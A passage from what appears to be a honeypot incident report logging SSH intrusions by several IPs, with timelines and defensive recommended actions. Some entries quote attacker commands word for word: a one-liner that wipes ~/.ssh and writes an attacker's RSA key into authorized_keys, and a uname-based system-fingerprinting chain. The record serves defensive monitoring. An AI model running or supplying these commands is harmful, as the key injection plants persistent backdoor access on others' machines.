| `2026-07-06 05:35:23` | `cowrie.login.success` |
| `2026-07-06 05:35:25` | `cowrie.session.params` |
| `2026-07-06 05:35:25` | `cowrie.command.input` |
| `2026-07-06 05:35:25` | `cowrie.command.input` |
| `2026-07-06 05:35:25` | `cowrie.command.input` |
| `2026-07-06 05:35:25` | `cowrie.command.input` |
| `2026-07-06 05:35:25` | `cowrie.command.input` |
| `2026-07-06 05:35:25` | `cowrie.command.success` |
| `2026-07-06 05:35:25` | `cowrie.command.input` |
| `2026-07-06 05:35:25` | `cowrie.command.input` |
| `2026-07-06 05:35:25` | `cowrie.command.input` |
| `2026-07-06 05:35:25` | `cowrie.command.input` |
| `2026-07-06 05:35:25` | `cowrie.log.closed` |
| `2026-07-06 05:35:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-52ff5af5d45d

| Field | Detail |
|---|---|
| **Source IP** | `71.174.59[.]203` |
| **First Seen** | 2026-07-06 05:35 |
| **Last Seen** | 2026-07-06 05:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:35:31` | `cowrie.session.connect` |
| `2026-07-06 05:35:31` | `cowrie.client.version` |
| `2026-07-06 05:35:31` | `cowrie.client.kex` |
| `2026-07-06 05:35:31` | `cowrie.login.success` |
| `2026-07-06 05:35:32` | `cowrie.session.params` |
| `2026-07-06 05:35:32` | `cowrie.command.input` |
| `2026-07-06 05:35:32` | `cowrie.command.failed` |
| `2026-07-06 05:35:32` | `cowrie.log.closed` |
| `2026-07-06 05:35:33` | `cowrie.session.params` |
| `2026-07-06 05:35:33` | `cowrie.command.input` |
| `2026-07-06 05:35:33` | `cowrie.session.file_download` |
| `2026-07-06 05:35:33` | `cowrie.log.closed` |
| `2026-07-06 05:35:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `71.174.59[.]203` to AbuseIPDB if not already reported
- [ ] Block `71.174.59[.]203` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a693c4d49786

| Field | Detail |
|---|---|
| **Source IP** | `71.174.59[.]203` |
| **First Seen** | 2026-07-06 05:35 |
| **Last Seen** | 2026-07-06 05:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:35:33` | `cowrie.session.connect` |
| `2026-07-06 05:35:33` | `cowrie.client.version` |
| `2026-07-06 05:35:33` | `cowrie.client.kex` |
| `2026-07-06 05:35:33` | `cowrie.login.success` |
| `2026-07-06 05:35:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `71.174.59[.]203` to AbuseIPDB if not already reported
- [ ] Block `71.174.59[.]203` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17cb5e3e38a2

| Field | Detail |
|---|---|
| **Source IP** | `71.174.59[.]203` |
| **First Seen** | 2026-07-06 05:35 |
| **Last Seen** | 2026-07-06 05:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:35:33` | `cowrie.session.connect` |
| `2026-07-06 05:35:33` | `cowrie.client.version` |
| `2026-07-06 05:35:33` | `cowrie.client.kex` |
| `2026-07-06 05:35:33` | `cowrie.login.success` |
| `2026-07-06 05:35:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `71.174.59[.]203` to AbuseIPDB if not already reported
- [ ] Block `71.174.59[.]203` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-618addde24c7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 05:36 |
| **Last Seen** | 2026-07-06 05:36 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:36:04` | `cowrie.session.connect` |
| `2026-07-06 05:36:04` | `cowrie.client.version` |
| `2026-07-06 05:36:04` | `cowrie.client.kex` |
| `2026-07-06 05:36:08` | `cowrie.login.success` |
| `2026-07-06 05:36:10` | `cowrie.session.params` |
| `2026-07-06 05:36:10` | `cowrie.command.input` |
| `2026-07-06 05:36:10` | `cowrie.command.input` |
| `2026-07-06 05:36:10` | `cowrie.command.input` |
| `2026-07-06 05:36:10` | `cowrie.command.input` |
| `2026-07-06 05:36:10` | `cowrie.command.input` |
| `2026-07-06 05:36:10` | `cowrie.command.success` |
| `2026-07-06 05:36:10` | `cowrie.command.input` |
| `2026-07-06 05:36:10` | `cowrie.command.input` |
| `2026-07-06 05:36:10` | `cowrie.command.input` |
| `2026-07-06 05:36:10` | `cowrie.command.input` |
| `2026-07-06 05:36:11` | `cowrie.log.closed` |
| `2026-07-06 05:36:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-437100435eb1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 05:36 |
| **Last Seen** | 2026-07-06 05:36 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:36:51` | `cowrie.session.connect` |
| `2026-07-06 05:36:52` | `cowrie.client.version` |
| `2026-07-06 05:36:52` | `cowrie.client.kex` |
| `2026-07-06 05:36:55` | `cowrie.login.success` |
| `2026-07-06 05:36:57` | `cowrie.session.params` |
| `2026-07-06 05:36:57` | `cowrie.command.input` |
| `2026-07-06 05:36:57` | `cowrie.command.input` |
| `2026-07-06 05:36:57` | `cowrie.command.input` |
| `2026-07-06 05:36:57` | `cowrie.command.input` |
| `2026-07-06 05:36:57` | `cowrie.command.input` |
| `2026-07-06 05:36:57` | `cowrie.command.success` |
| `2026-07-06 05:36:57` | `cowrie.command.input` |
| `2026-07-06 05:36:57` | `cowrie.command.input` |
| `2026-07-06 05:36:57` | `cowrie.command.input` |
| `2026-07-06 05:36:57` | `cowrie.command.input` |
| `2026-07-06 05:36:58` | `cowrie.log.closed` |
| `2026-07-06 05:36:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94aabf9e10fd

| Field | Detail |
|---|---|
| **Source IP** | `165.154.254[.]143` |
| **First Seen** | 2026-07-06 05:37 |
| **Last Seen** | 2026-07-06 05:37 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:37:25` | `cowrie.session.connect` |
| `2026-07-06 05:37:25` | `cowrie.client.version` |
| `2026-07-06 05:37:25` | `cowrie.client.kex` |
| `2026-07-06 05:37:25` | `cowrie.login.success` |
| `2026-07-06 05:37:26` | `cowrie.session.params` |
| `2026-07-06 05:37:26` | `cowrie.command.input` |
| `2026-07-06 05:37:26` | `cowrie.command.failed` |
| `2026-07-06 05:37:26` | `cowrie.log.closed` |
| `2026-07-06 05:37:27` | `cowrie.session.params` |
| `2026-07-06 05:37:27` | `cowrie.command.input` |
| `2026-07-06 05:37:27` | `cowrie.session.file_download` |
| `2026-07-06 05:37:27` | `cowrie.log.closed` |
| `2026-07-06 05:37:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.254[.]143` to AbuseIPDB if not already reported
- [ ] Block `165.154.254[.]143` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5033b136f9ca

| Field | Detail |
|---|---|
| **Source IP** | `165.154.254[.]143` |
| **First Seen** | 2026-07-06 05:37 |
| **Last Seen** | 2026-07-06 05:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:37:27` | `cowrie.session.connect` |
| `2026-07-06 05:37:27` | `cowrie.client.version` |
| `2026-07-06 05:37:27` | `cowrie.client.kex` |
| `2026-07-06 05:37:27` | `cowrie.login.success` |
| `2026-07-06 05:37:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.254[.]143` to AbuseIPDB if not already reported
- [ ] Block `165.154.254[.]143` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e53621c1b48

| Field | Detail |
|---|---|
| **Source IP** | `165.154.254[.]143` |
| **First Seen** | 2026-07-06 05:37 |
| **Last Seen** | 2026-07-06 05:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:37:27` | `cowrie.session.connect` |
| `2026-07-06 05:37:27` | `cowrie.client.version` |
| `2026-07-06 05:37:28` | `cowrie.client.kex` |
| `2026-07-06 05:37:28` | `cowrie.login.success` |
| `2026-07-06 05:37:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.254[.]143` to AbuseIPDB if not already reported
- [ ] Block `165.154.254[.]143` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-483ef75161e1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 05:37 |
| **Last Seen** | 2026-07-06 05:37 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:37:38` | `cowrie.session.connect` |
| `2026-07-06 05:37:39` | `cowrie.client.version` |
| `2026-07-06 05:37:39` | `cowrie.client.kex` |
| `2026-07-06 05:37:42` | `cowrie.login.success` |
| `2026-07-06 05:37:44` | `cowrie.session.params` |
| `2026-07-06 05:37:44` | `cowrie.command.input` |
| `2026-07-06 05:37:44` | `cowrie.command.input` |
| `2026-07-06 05:37:44` | `cowrie.command.input` |
| `2026-07-06 05:37:44` | `cowrie.command.input` |
| `2026-07-06 05:37:44` | `cowrie.command.input` |
| `2026-07-06 05:37:44` | `cowrie.command.success` |
| `2026-07-06 05:37:44` | `cowrie.command.input` |
| `2026-07-06 05:37:44` | `cowrie.command.input` |
| `2026-07-06 05:37:44` | `cowrie.command.input` |
| `2026-07-06 05:37:44` | `cowrie.command.input` |
| `2026-07-06 05:37:45` | `cowrie.log.closed` |
| `2026-07-06 05:37:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ac6bcf315a5

| Field | Detail |
|---|---|
| **Source IP** | `135.13.28[.]35` |
| **First Seen** | 2026-07-06 05:37 |
| **Last Seen** | 2026-07-06 05:37 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:37:42` | `cowrie.session.connect` |
| `2026-07-06 05:37:42` | `cowrie.client.version` |
| `2026-07-06 05:37:42` | `cowrie.client.kex` |
| `2026-07-06 05:37:44` | `cowrie.login.success` |
| `2026-07-06 05:37:45` | `cowrie.session.params` |
| `2026-07-06 05:37:45` | `cowrie.command.input` |
| `2026-07-06 05:37:45` | `cowrie.command.failed` |
| `2026-07-06 05:37:45` | `cowrie.log.closed` |
| `2026-07-06 05:37:46` | `cowrie.session.params` |
| `2026-07-06 05:37:46` | `cowrie.command.input` |
| `2026-07-06 05:37:46` | `cowrie.session.file_download` |
| `2026-07-06 05:37:46` | `cowrie.log.closed` |
| `2026-07-06 05:37:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `135.13.28[.]35` to AbuseIPDB if not already reported
- [ ] Block `135.13.28[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a00abff5c8b0

| Field | Detail |
|---|---|
| **Source IP** | `135.13.28[.]35` |
| **First Seen** | 2026-07-06 05:37 |
| **Last Seen** | 2026-07-06 05:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:37:46` | `cowrie.session.connect` |
| `2026-07-06 05:37:46` | `cowrie.client.version` |
| `2026-07-06 05:37:46` | `cowrie.client.kex` |
| `2026-07-06 05:37:47` | `cowrie.login.success` |
| `2026-07-06 05:37:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `135.13.28[.]35` to AbuseIPDB if not already reported
- [ ] Block `135.13.28[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1bc89f682959

| Field | Detail |
|---|---|
| **Source IP** | `135.13.28[.]35` |
| **First Seen** | 2026-07-06 05:37 |
| **Last Seen** | 2026-07-06 05:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:37:48` | `cowrie.session.connect` |
| `2026-07-06 05:37:48` | `cowrie.client.version` |
| `2026-07-06 05:37:48` | `cowrie.client.kex` |
| `2026-07-06 05:37:49` | `cowrie.login.success` |
| `2026-07-06 05:37:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `135.13.28[.]35` to AbuseIPDB if not already reported
- [ ] Block `135.13.28[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5aea92135dbf

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 05:38 |
| **Last Seen** | 2026-07-06 05:38 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:38:22` | `cowrie.session.connect` |
| `2026-07-06 05:38:23` | `cowrie.client.version` |
| `2026-07-06 05:38:23` | `cowrie.client.kex` |
| `2026-07-06 05:38:27` | `cowrie.login.success` |
| `2026-07-06 05:38:29` | `cowrie.session.params` |
| `2026-07-06 05:38:29` | `cowrie.command.input` |
| `2026-07-06 05:38:29` | `cowrie.command.input` |
| `2026-07-06 05:38:29` | `cowrie.command.input` |
| `2026-07-06 05:38:29` | `cowrie.command.input` |
| `2026-07-06 05:38:29` | `cowrie.command.input` |
| `2026-07-06 05:38:29` | `cowrie.command.success` |
| `2026-07-06 05:38:29` | `cowrie.command.input` |
| `2026-07-06 05:38:29` | `cowrie.command.input` |
| `2026-07-06 05:38:29` | `cowrie.command.input` |
| `2026-07-06 05:38:29` | `cowrie.command.input` |
| `2026-07-06 05:38:29` | `cowrie.log.closed` |
| `2026-07-06 05:38:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-278f6607d50c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 05:39 |
| **Last Seen** | 2026-07-06 05:39 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:39:09` | `cowrie.session.connect` |
| `2026-07-06 05:39:09` | `cowrie.client.version` |
| `2026-07-06 05:39:09` | `cowrie.client.kex` |
| `2026-07-06 05:39:13` | `cowrie.login.success` |
| `2026-07-06 05:39:15` | `cowrie.session.params` |
| `2026-07-06 05:39:15` | `cowrie.command.input` |
| `2026-07-06 05:39:15` | `cowrie.command.input` |
| `2026-07-06 05:39:15` | `cowrie.command.input` |
| `2026-07-06 05:39:15` | `cowrie.command.input` |
| `2026-07-06 05:39:15` | `cowrie.command.input` |
| `2026-07-06 05:39:15` | `cowrie.command.success` |
| `2026-07-06 05:39:15` | `cowrie.command.input` |
| `2026-07-06 05:39:15` | `cowrie.command.input` |
| `2026-07-06 05:39:15` | `cowrie.command.input` |
| `2026-07-06 05:39:15` | `cowrie.command.input` |
| `2026-07-06 05:39:15` | `cowrie.log.closed` |
| `2026-07-06 05:39:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28249de89185

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 05:39 |
| **Last Seen** | 2026-07-06 05:40 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:39:53` | `cowrie.session.connect` |
| `2026-07-06 05:39:54` | `cowrie.client.version` |
| `2026-07-06 05:39:54` | `cowrie.client.kex` |
| `2026-07-06 05:39:57` | `cowrie.login.success` |
| `2026-07-06 05:39:59` | `cowrie.session.params` |
| `2026-07-06 05:39:59` | `cowrie.command.input` |
| `2026-07-06 05:39:59` | `cowrie.command.input` |
| `2026-07-06 05:39:59` | `cowrie.command.input` |
| `2026-07-06 05:39:59` | `cowrie.command.input` |
| `2026-07-06 05:39:59` | `cowrie.command.input` |
| `2026-07-06 05:39:59` | `cowrie.command.success` |
| `2026-07-06 05:39:59` | `cowrie.command.input` |
| `2026-07-06 05:39:59` | `cowrie.command.input` |
| `2026-07-06 05:39:59` | `cowrie.command.input` |
| `2026-07-06 05:39:59` | `cowrie.command.input` |
| `2026-07-06 05:40:00` | `cowrie.log.closed` |
| `2026-07-06 05:40:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81944f87d4f3

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 05:40 |
| **Last Seen** | 2026-07-06 05:40 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
